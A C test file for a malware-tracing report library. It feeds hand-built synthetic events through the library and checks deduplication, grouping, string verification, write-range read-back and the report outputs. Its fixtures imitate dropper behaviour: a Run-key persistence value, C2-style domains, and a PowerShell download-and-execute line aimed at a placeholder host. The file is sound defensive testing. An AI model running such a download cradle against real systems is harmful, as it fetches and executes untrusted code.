/*
 * report_model - the report, from synthetic events through to the three files.
 *
 * WHY IT IS BUILT THIS WAY. kofmontrace needs an elevated prompt, a live
 * sample and an ETW session, so the report cannot be exercised by running the
 * tool - and the half worth testing is not the collector anyway. It is what
 * happens to the events afterwards: dedup, the grouping, the normalised
 * spelling, the read-back of a written range, and whether an observed string
 * turns out to be in the subject's bytes.
 *
 * All of that consumes struct kof_evt, which this file writes by hand. That is
 * the property the whole design is for - kofevtlog.h says it plainly: a rule
 * that cannot be run against a recorded trace cannot be regression tested. The
 * records below are a recorded trace that never needed a machine.
 *
 * THE CASES CHOSEN ARE THE ONES WHERE BEING WRONG IS SILENT:
 *
 *   dedup           a program writing one value ten thousand times must be one
 *                   fingerprint with a count, not ten thousand lines.
 *   grouping        a random temp name grouped as stable would put a
 *                   one-run-only string into a signature draft, where it
 *                   compiles, loads, and never matches.
 *   the invariant   the reason volatile fingerprints are kept rather than
 *                   dropped is that `norm` makes them usable. If it comes back
 *                   empty they are merely labelled.
 *   in_sample       "absent" is the answer that changes what a researcher
 *                   does. Reporting absent for a string that IS there is the
 *                   worst single failure this library can have.
 *   the range       bytes read back from a write, with at_finish set. The
 *                   caveat is the evidence's whole legal standing.
 *   continuations   a script split across records must not become one
 *                   fingerprint per chunk.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#include "../../libkoforbit/kofreport/kofreport.h"
#include "../../libkofeng/kofeng.h"

static int failures;

static void fail(const char *what, const char *why)
{
	printf("  FAIL %s: %s\n", what, why);
	failures++;
}

static void eq_u(const char *what, uint64_t got, uint64_t want)
{
	if (got != want) {
		printf("  FAIL %s: got %llu, want %llu\n", what,
		       (unsigned long long)got, (unsigned long long)want);
		failures++;
	}
}

/* ---- writing records by hand -------------------------------------------- */

/*
 * The text arena, filled the way a collector fills it: strings appended,
 * offsets recorded, KOF_TEXT_NONE for the ones this verb does not carry. Done
 * here rather than through a helper in kofevt because there is no such helper -
 * the only writer is a collector, and it has its own.
 */
static void mk(struct kof_evt *e, uint16_t verb, uint32_t pid, uint64_t stamp)
{
	memset(e, 0, sizeof *e);
	e->verb       = verb;
	e->pid        = pid;
	e->actor_pid  = pid;
	e->stamp      = stamp;
	e->os         = KOF_OS_WINDOWS;
	e->off_image  = KOF_TEXT_NONE;
	e->off_object = KOF_TEXT_NONE;
	e->off_cmdline = KOF_TEXT_NONE;
}

static uint16_t put(struct kof_evt *e, const char *s)
{
	size_t n = strlen(s);
	uint16_t at = e->text_len;

	if (at + n + 1u > sizeof e->text)
		return KOF_TEXT_NONE;
	memcpy(e->text + at, s, n + 1u);
	e->text_len = (uint16_t)(at + n + 1u);
	return at;
}

static void obj(struct kof_evt *e, const char *path)
{
	e->off_object = put(e, path);
	e->loc        = kof_classify(path, &e->attack);
}

/* ---- the fixture on disk ------------------------------------------------- */

/*
 * A REAL FILE FOR THE SUBJECT, because the string verification reads bytes and
 * a mocked one would be testing the mock.
 *
 * It holds one narrow literal and one UTF-16 literal, which are the two
 * answers that matter: a rule written from the narrow form of a wide string
 * matches nothing, and only the bytes can tell the two apart.
 */
static const char NARROW[] = "C:\\ProgramData\\svc32.exe";
static const char WIDE[]   = "widestr.dll";

static int write_subject(const char *path)
{
	FILE *f = fopen(path, "wb");
	size_t i;

	if (!f)
		return -1;
	fputs("MZ\x90\x00 padding so the head is not the string ", f);
	fwrite(NARROW, 1, sizeof NARROW - 1u, f);
	fputs(" more padding ", f);
	for (i = 0; i < sizeof WIDE - 1u; i++) {
		fputc(WIDE[i], f);
		fputc(0, f);
	}
	fputs(" tail", f);
	fclose(f);
	return 0;
}

/* A file for the write-range case: the sample "appended" to it, so the report
 * reads that range back. */
static const char APPENDED[] = "127.0.0.1 tracking.example.invalid";

static int write_victim(const char *path, uint64_t *off)
{
	FILE *f = fopen(path, "wb");

	if (!f)
		return -1;
	fputs("# hosts file that already existed\n", f);
	*off = 34u;    /* the length of the line above, where the write landed */
	fputs(APPENDED, f);
	fclose(f);
	return 0;
}

static const struct kof_fingerprint *look(struct kof_report *r, uint8_t kind,
					  const char *needle)
{
	size_t i, n = kof_report_count(r);

	for (i = 0; i < n; i++) {
		const struct kof_fingerprint *f = kof_report_at(r, i);

		if (f && f->kind == kind && strstr(f->text, needle))
			return f;
	}
	return NULL;
}

int main(void)
{
	const char *dir     = "report_model.tmp";
	const char *subject = "report_model.tmp.subject";
	const char *victim  = "report_model.tmp.victim";
	struct kof_report_info ri;
	struct kof_report_stage st;
	struct kof_report *r;
	struct kof_evt e;
	uint64_t victim_off = 0;
	uint64_t t = 132000000000000000ull;   /* a plausible FILETIME */
	const struct kof_fingerprint *f;

	if (write_subject(subject) || write_victim(victim, &victim_off)) {
		puts("  FAIL could not write the fixtures");
		return 1;
	}

	memset(&ri, 0, sizeof ri);
	ri.tool        = "report_model";
	ri.subject     = subject;
	ri.subject_cmd = "report_model.tmp.subject --go";
	ri.root_pid    = 100u;
	ri.build       = 1u;
	ri.platform    = kof_evt_platform_self();
	ri.arch        = kof_evt_arch_self();
	ri.dir         = dir;
	ri.log         = "report_model.kel";

	r = kof_report_open(&ri);
	if (!r) {
		puts("  FAIL kof_report_open");
		return 1;
	}

	/* --- the tree ---------------------------------------------------- */
	mk(&e, KOF_EVT_PROC_START, 100u, t);
	e.ppid = 4u;
	e.off_image = put(&e, subject);
	e.off_cmdline = put(&e, "report_model.tmp.subject --go");
	kof_report_feed(r, &e, 0);

	mk(&e, KOF_EVT_PROC_START, 101u, t + 1000u);
	e.ppid = 100u;
	e.off_image = put(&e, "C:\\Windows\\System32\\cmd.exe");
	e.off_cmdline = put(&e, "cmd /c del /q nothing");
	kof_report_feed(r, &e, 1);

	/* --- a random temp name, written four times ---------------------- */
	{
		unsigned i;

		for (i = 0; i < 4u; i++) {
			mk(&e, KOF_EVT_FILE_NEW, 100u, t + 2000u + i);
			obj(&e, "C:\\Users\\bob\\AppData\\Local\\Temp\\a8f31c2d.tmp");
			kof_report_feed(r, &e, 2 + i);
		}
	}

	/* --- a path that IS a literal in the subject --------------------- */
	mk(&e, KOF_EVT_FILE_NEW, 100u, t + 3000u);
	obj(&e, NARROW);
	kof_report_feed(r, &e, 10);

	/* --- and one that is not anywhere in it -------------------------- */
	mk(&e, KOF_EVT_FILE_NEW, 100u, t + 3100u);
	obj(&e, "C:\\nowhere\\zzqx-not-in-the-sample.bin");
	kof_report_feed(r, &e, 11);

	/* --- a module whose name is UTF-16 in the subject ---------------- */
	mk(&e, KOF_EVT_IMAGE_LOAD, 100u, t + 3200u);
	obj(&e, "C:\\opt\\widestr.dll");
	kof_report_feed(r, &e, 12);

	/* --- a system module: the machine's own noise -------------------- */
	mk(&e, KOF_EVT_IMAGE_LOAD, 100u, t + 3300u);
	obj(&e, "C:\\Windows\\System32\\ntdll.dll");
	kof_report_feed(r, &e, 13);

	/* --- a Run value: a location the matrix names -------------------- */
	mk(&e, KOF_EVT_REG_SET_VALUE, 100u, t + 4000u);
	obj(&e, "\\REGISTRY\\MACHINE\\Software\\Microsoft\\Windows\\"
		"CurrentVersion\\Run\\Updater");
	kof_report_feed(r, &e, 14);

	/*
	 * AND A CREATE, WHICH IS NOT A CHANGE.
	 *
	 * RegCreateKeyEx opens an existing key as readily as it makes one, and
	 * the kernel raises CreateKey either way - so this is what reading a
	 * key looks like from outside, and it is what nslookup.kevt is eight
	 * times over. It must not read as a registry modification, and it must
	 * not be dropped either.
	 */
	mk(&e, KOF_EVT_REG_CREATE, 100u, t + 4100u);
	obj(&e, "\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\Tcpip\\"
		"Parameters");
	kof_report_feed(r, &e, 21);

	/* --- a routable peer, and a loopback one ------------------------- */
	mk(&e, KOF_EVT_NET_CONNECT, 100u, t + 5000u);
	{
		struct kof_evt_net *n = kof_evt_set_net(&e);
		uint32_t be;
		unsigned char q[4] = { 93u, 184u, 216u, 34u };

		memcpy(&be, q, 4);
		kof_evt_ip_set_v4(n->daddr, be);
		n->dport = 0xbb01u;     /* 443, network order */
	}
	kof_report_feed(r, &e, 15);

	mk(&e, KOF_EVT_NET_CONNECT, 100u, t + 5100u);
	{
		struct kof_evt_net *n = kof_evt_set_net(&e);

		n->daddr[15] = 1u;      /* ::1 */
		n->dport = 0x901fu;
	}
	kof_report_feed(r, &e, 16);

	/* --- a name, which outlives the address it resolved to ----------- */
	mk(&e, KOF_EVT_DNS_QUERY, 100u, t + 5200u);
	obj(&e, "cdn.example-c2.invalid");
	kof_report_feed(r, &e, 17);

	/*
	 * AND THE SAME TWO KINDS AS THEY ACTUALLY ARRIVE TODAY: untyped, with
	 * only the provider to file them by.
	 *
	 * wevt_decode.c has no established ids for Kernel-Registry or for the
	 * DNS client and refuses to guess them, so on this build every registry
	 * write and every lookup is a KOF_EVT_RAW carrying its source and its
	 * path. If the report does not file those, it reports no registry
	 * activity for a dropper that just established persistence - which
	 * reads as a sample that touched nothing, and is the most expensive
	 * silence this library could have.
	 */
	mk(&e, KOF_EVT_RAW, 100u, t + 5300u);
	e.source = KOF_SRC_REGISTRY;
	e.raw_id = 13u;
	obj(&e, "\\REGISTRY\\MACHINE\\System\\CurrentControlSet\\Services\\Zzsvc");
	kof_report_feed(r, &e, 22);

	mk(&e, KOF_EVT_RAW, 100u, t + 5400u);
	e.source = KOF_SRC_DNS;
	/* 3018, the cache lookup - a real stage that stays untyped, unlike
	 * 3008 which type_of now names. */
	e.raw_id = 3018u;
	obj(&e, "untyped.example-c2.invalid");
	kof_report_feed(r, &e, 23);

	/* --- a script, and then a continuation that must be ignored ------ */
	mk(&e, KOF_EVT_AMSI_SCAN, 101u, t + 6000u);
	{
		static const char script[] =
			"IEX (New-Object Net.WebClient).DownloadString('http://x')";

		e.off_object  = e.text_len;
		memcpy(e.text + e.text_len, script, sizeof script);
		e.content_len = (uint16_t)(sizeof script - 1u);
		e.text_len    = (uint16_t)(e.text_len + sizeof script);
	}
	kof_report_feed(r, &e, 18);

	mk(&e, KOF_EVT_CONT, 101u, t + 6001u);
	{
		static const char tail[] = "...the rest of the same script...";

		e.off_object  = e.text_len;
		memcpy(e.text + e.text_len, tail, sizeof tail);
		e.content_len = (uint16_t)(sizeof tail - 1u);
		e.text_len    = (uint16_t)(e.text_len + sizeof tail);
	}
	kof_report_feed(r, &e, 19);

	/* --- a write into a file that already existed -------------------- */
	mk(&e, KOF_EVT_FILE_WRITE, 100u, t + 7000u);
	obj(&e, victim);
	{
		struct kof_evt_file *fl = kof_evt_set_file(&e);

		if (!fl)
			fail("build", "a file event has no file payload");
		else {
			fl->offset = victim_off;
			fl->size   = (uint32_t)(sizeof APPENDED - 1u);
		}
	}
	kof_report_feed(r, &e, 20);

	/* ---- what the feed phase should have made ----------------------- */

	eq_u("processes", kof_report_procs(r), 2u);
	{
		const struct kof_rep_proc *p = kof_report_proc_at(r, 1);

		if (!p)
			fail("tree", "no second process");
		else {
			eq_u("child pid", p->pid, 101u);
			/* Depth from the parent already in the table - a child
			 * cannot be created before its parent exists, so this
			 * holds without relying on arrival order. */
			eq_u("child depth", p->depth, 1u);
		}
	}

	f = look(r, KOF_FP_FILE_NEW, "a8f31c2d.tmp");
	if (!f) {
		fail("dedup", "the temp file produced no fingerprint");
	} else {
		eq_u("dedup count", f->count, 4u);
		if (f->group != KOF_RG_VOLATILE)
			fail("grouping", "a random temp name is not volatile");
		if (!f->why || !*f->why)
			fail("grouping", "volatile with no reason given");
		/* The reason volatile fingerprints are kept rather than
		 * dropped: without this the group is a label and not a
		 * usable answer. */
		if (!f->norm || !strchr(f->norm, '*'))
			fail("grouping", "no invariant spelling for a volatile "
					 "path");
	}

	f = look(r, KOF_FP_MODULE, "ntdll.dll");
	if (!f)
		fail("ambient", "the system module produced no fingerprint");
	else if (f->group != KOF_RG_AMBIENT)
		fail("ambient", "a System32 module is not ambient");

	f = look(r, KOF_FP_PEER, "93.184.216.34");
	if (!f)
		fail("peer", "no fingerprint for the routable peer");
	else {
		if (strcmp(f->text, "93.184.216.34:443"))
			fail("peer", f->text);
		if (f->group != KOF_RG_STABLE)
			fail("peer", "a routable peer is not stable");
	}

	f = look(r, KOF_FP_PEER, "::1");
	if (!f)
		fail("peer", "no fingerprint for the loopback peer");
	else if (f->group != KOF_RG_AMBIENT)
		fail("peer", "loopback is not ambient");

	f = look(r, KOF_FP_REGISTRY, "Run\\Updater");
	if (!f) {
		fail("registry", "no fingerprint for the Run value");
	} else {
		if (strcmp(kof_attack_id(f->attack), "T1547.001"))
			fail("registry", kof_attack_id(f->attack));
		if (f->group != KOF_RG_STABLE)
			fail("registry", "a Run value is not stable");
	}

	if (!look(r, KOF_FP_DNS, "cdn.example-c2"))
		fail("dns", "no fingerprint for the looked-up name");

	/*
	 * The opened key: kept, and grouped as the machine's own noise with a
	 * reason - not dropped, and not sitting in the section a reader takes
	 * signature material from.
	 */
	f = look(r, KOF_FP_REGISTRY, "Tcpip\\Parameters");
	if (!f) {
		fail("reg create", "an opened key produced no fingerprint - it "
				   "must be kept, not filtered");
	} else {
		if (f->group != KOF_RG_AMBIENT)
			fail("reg create", "a key opened with create "
					   "disposition is offered as signature "
					   "material");
		if (!f->why || !*f->why)
			fail("reg create", "grouped ambient with no reason");
	}

	/* And the Run VALUE is the one that stays stable - the distinction the
	 * grouping above exists to preserve. */
	f = look(r, KOF_FP_REGISTRY, "Run\\Updater");
	if (f && f->group != KOF_RG_STABLE)
		fail("reg set", "a SetValue under Run was grouped away");

	/* The untyped pair, filed by provider - the shape every real run
	 * produces until the ids are established. */
	/*
	 * A DNS record with no typed id is DELIBERATELY not filed - the
	 * resolver raises several events per lookup and every one carries the
	 * same name, so filing them would leave a fingerprint whose count says
	 * the sample resolved one host six times. See the KOF_EVT_RAW case.
	 */
	if (look(r, KOF_FP_DNS, "untyped.example-c2"))
		fail("untyped", "an untyped DNS record was filed, which inflates "
				"the count of every resolution");
	f = look(r, KOF_FP_REGISTRY, "Services\\Zzsvc");
	if (!f) {
		fail("untyped", "a registry record with no typed id produced "
				"no fingerprint");
	} else {
		/* The location table classified the path even though the verb
		 * is unknown, because kof_classify works on the string - which
		 * is the whole reason the technique tag is computed at the
		 * edge rather than by a rule. */
		if (strcmp(kof_attack_id(f->attack), "T1543.003"))
			fail("untyped", kof_attack_id(f->attack));
	}

	/* One script, not two: the continuation is the tail of the record in
	 * front of it and is not an event. */
	{
		size_t i, n = kof_report_count(r), scripts = 0;

		for (i = 0; i < n; i++) {
			const struct kof_fingerprint *g = kof_report_at(r, i);

			if (g && g->kind == KOF_FP_SCRIPT)
				scripts++;
		}
		eq_u("script fingerprints", scripts, 1u);
	}

	/* ---- the artefact phase ----------------------------------------- */

	memset(&st, 0, sizeof st);
	st.collect = 1u;
	/* No engine on purpose: this is the shape a host without a database
	 * gets, and every verdict must come back "not asked" rather than
	 * looking clean. The string verification does NOT need the engine -
	 * it reads the subject's bytes - so it still has to work here. */
	if (kof_report_finish(r, &st) < 0)
		fail("finish", "the artefact phase refused the directory");

	f = look(r, KOF_FP_FILE_NEW, "zzqx-not-in-the-sample");
	if (!f) {
		fail("verify", "the absent path produced no fingerprint");
	} else {
		if (f->in_sample != KOF_FP_SEEN_ABSENT)
			fail("verify", "a string that is not in the subject was "
					"not reported absent");
		/* It was never created, so there is nothing to collect - and
		 * the report must say which of the two reasons applies. */
		if (f->bytes.why_not != KOF_FP_WHY_GONE)
			fail("verify", "a path that never existed is not "
					"reported as gone");
	}

	f = look(r, KOF_FP_FILE_NEW, "svc32.exe");
	if (!f)
		fail("verify", "the narrow literal produced no fingerprint");
	else if (f->in_sample != KOF_FP_SEEN_PRESENT)
		fail("verify", "a literal that IS in the subject was not found");

	f = look(r, KOF_FP_MODULE, "widestr.dll");
	if (!f) {
		fail("verify", "the wide literal produced no fingerprint");
	} else {
		/*
		 * A FRAGMENT, AND WIDE. The subject holds "widestr.dll" as
		 * UTF-16 and not the directory in front of it, which is the
		 * everyday case: the sample carries the leaf name and composes
		 * the path. So only part of the fingerprint's text is present -
		 * and the ENCODING of that part is what decides whether a
		 * declaration written from it can ever match, which is why the
		 * flag is checked separately from how much matched.
		 */
		if (f->in_sample != KOF_FP_SEEN_WIDE &&
		    f->in_sample != KOF_FP_SEEN_PART)
			fail("verify", "a UTF-16 literal was not found");
		if (!(f->flags & KOF_FP_F_WIDE))
			fail("verify", "a UTF-16 match did not set the wide "
					"flag, so a draft would declare it "
					"narrow and match nothing");
	}

	/* The write range, read back off the disk, with the caveat set. */
	f = look(r, KOF_FP_FILE_WRITE, "victim");
	if (!f) {
		fail("range", "the write produced no fingerprint");
	} else {
		eq_u("range offset", f->bytes.offset, victim_off);
		eq_u("range claimed", f->bytes.claimed, sizeof APPENDED - 1u);
		eq_u("range got", f->bytes.got, sizeof APPENDED - 1u);
		if (!f->bytes.at_finish)
			fail("range", "the read-back is not marked as having "
					"happened at the end of the run");
		if (!f->bytes.sha256[0])
			fail("range", "no digest over the range");
		if (f->bytes.preview_len < 8u ||
		    memcmp(f->bytes.preview, APPENDED, 8u))
			fail("range", "the preview is not the bytes that were "
					"at the offset");
	}

	/* The created file that DOES exist got hashed and stored under its
	 * digest - the subject itself, which the tree "created" in this
	 * fixture only in the sense that a record says so. */
	{
		char want[65];
		uint64_t sz = 0;

		f = look(r, KOF_FP_FILE_NEW, "svc32.exe");
		if (f && kof_sha256_file(subject, want, &sz) == 0) {
			/* Not the same file, so not the same digest: this is
			 * only checking that a MISSING file leaves the digest
			 * empty rather than filled with something plausible. */
			if (f->bytes.file_sha256[0])
				fail("collect", "a file that does not exist got "
						"a digest");
		}
	}

	/* Every verdict must say nobody asked, not that nothing was found. */
	{
		size_t i, n = kof_report_count(r);

		for (i = 0; i < n; i++) {
			const struct kof_fingerprint *g = kof_report_at(r, i);

			if (g && g->verdict.asked) {
				fail("verdict", "a verdict claims it was asked "
						"for with no engine given");
				break;
			}
		}
	}

	/* ---- the three outputs ------------------------------------------ */
	{
		char path[256];
		FILE *out;
		struct stat sb;

		snprintf(path, sizeof path, "%s/report.txt", dir);
		out = fopen(path, "wb");
		if (!out) {
			fail("emit", "the report directory was not created");
		} else {
			kof_report_write_text(r, out, 0);
			fclose(out);
			if (stat(path, &sb) || sb.st_size < 512)
				fail("emit", "report.txt is suspiciously short");
			remove(path);
		}

		snprintf(path, sizeof path, "%s/report.json", dir);
		out = fopen(path, "wb");
		if (out) {
			kof_report_write_json(r, out);
			fclose(out);
			if (stat(path, &sb) || sb.st_size < 512)
				fail("emit", "report.json is suspiciously "
					     "short");
			remove(path);
		}

		/*
		 * THE CANDIDATES MUST NOT CARRY THE AMBIENT GROUP.
		 *
		 * A rule on ntdll.dll matches every process on the machine.
		 * They stay in the report - a reader has to see they were
		 * considered - and they are not candidates, and this is the
		 * check that keeps those two facts apart.
		 */
		snprintf(path, sizeof path, "%s/candidates.tsv", dir);
		out = fopen(path, "wb");
		if (out) {
			kof_report_write_candidates(r, out);
			fclose(out);
			out = fopen(path, "rb");
			if (out) {
				char line[1024];

				while (fgets(line, sizeof line, out)) {
					if (line[0] == '#')
						continue;
					if (strstr(line, "ntdll.dll") ||
					    strstr(line, "\tambient\t")) {
						fail("candidates",
						     "an ambient fingerprint "
						     "was offered as a "
						     "candidate");
						break;
					}
				}
				fclose(out);
			}
			remove(path);
		}
	}

	kof_report_close(r);
	remove(subject);
	remove(victim);
	/*
	 * THE WHOLE DIRECTORY, CONTENTS FIRST - and the contents are the part
	 * this got wrong once.
	 *
	 * The write-range case produces evidence/0001.bin, and rmdir on a
	 * directory that still holds a file fails silently. The result was a
	 * report_model.tmp/ left in the tree after every run, which is a mess
	 * and is also how the next run passes for the wrong reason: a stale
	 * directory means the test never exercises the mkdir it depends on.
	 *
	 * Named explicitly rather than walked, because a walk here would be a
	 * recursive delete driven by a path, in a test, and the cost of
	 * getting that wrong is somebody's tree.
	 */
	{
		char path[256];

		snprintf(path, sizeof path, "%s/evidence/0001.bin", dir);
		remove(path);
		snprintf(path, sizeof path, "%s/files", dir);
		rmdir(path);
		snprintf(path, sizeof path, "%s/evidence", dir);
		rmdir(path);
		if (rmdir(dir) != 0)
			fail("cleanup", "the report directory could not be "
					"removed - something in it was not "
					"named here");
	}

	printf("report: feed, grouping, read-back and the three outputs %s\n",
	       failures ? "FAILED" : "ok");
	return failures != 0;
}
